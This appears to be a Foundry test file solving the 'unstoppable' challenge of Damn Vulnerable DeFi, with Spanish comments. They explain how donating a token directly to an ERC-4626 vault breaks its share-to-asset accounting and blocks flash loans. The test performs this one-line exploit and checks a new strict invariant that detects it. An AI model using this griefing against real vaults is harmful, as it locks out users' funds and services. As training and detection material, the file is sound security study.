// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";

/*
 * NEXUS Offensive · training/dvd · reto "unstoppable"
 *
 * CLASE DE BUG: ruptura de contabilidad por donación directa (griefing/DoS).
 *   El vault asume que shares y activos están 1:1 y lo EXIGE en cada flashLoan:
 *   `convertToShares(totalSupply) == totalAssets()`. Como `totalAssets()` lee el
 *   balance real del token, cualquiera puede transferir 1 token directamente al
 *   vault y romper esa igualdad para siempre → el flashLoan revierte (DoS).
 *
 * FAMILIA: Vault ERC-4626.
 *
 * INVARIANTE QUE LO ATRAPA (NUEVA — hueco del catálogo Capa 2):
 *   `vault.totalAssets() == vault.totalSupply()`  (shares respaldadas 1:1, sin
 *   tokens no contabilizados). El catálogo Capa 2 solo tenía V1 con `>=`
 *   (balance >= activos), que NO detecta la donación. Aquí hace falta la
 *   igualdad estricta. => HUECO.
 */
contract UnstoppableChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;

    DamnValuableToken public token;
    UnstoppableVault public vault;
    UnstoppableMonitor public monitorContract;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // SETS UP CHALLENGE - DO NOT TOUCH
    function setUp() public {
        startHoax(deployer);
        token = new DamnValuableToken();
        vault = new UnstoppableVault({_token: token, _owner: deployer, _feeRecipient: deployer});
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));
        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);
        monitorContract = new UnstoppableMonitor(address(vault));
        vault.transferOwnership(address(monitorContract));
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(true);
        monitorContract.checkFlashLoan(100e18);
        vm.stopPrank();
    }

    /// @notice INVARIANTE de la familia Vault: shares y activos 1:1.
    function _invariant_sharesBackedOneToOne() internal view returns (bool) {
        return vault.totalAssets() == vault.totalSupply();
    }

    function test_unstoppable() public checkSolvedByPlayer {
        // La invariante se sostiene en el estado inicial.
        assertTrue(_invariant_sharesBackedOneToOne(), "INV debe sostenerse al inicio");
        console.log("INV inicial  totalAssets==totalSupply:", _invariant_sharesBackedOneToOne());

        // EXPLOIT: donación directa de 1 token rompe la contabilidad.
        token.transfer(address(vault), 1);

        // La invariante queda rota → el flashLoan ya no es posible (DoS).
        assertFalse(_invariant_sharesBackedOneToOne(), "INV debe romperse tras la donacion");
        console.log("INV tras donacion                    :", _invariant_sharesBackedOneToOne());
    }

    // CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
    function _isSolved() private {
        vm.prank(deployer);
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(false);
        monitorContract.checkFlashLoan(100e18);
        assertTrue(vault.paused(), "Vault is not paused");
        assertEq(vault.owner(), deployer, "Vault did not change owner");
    }
}
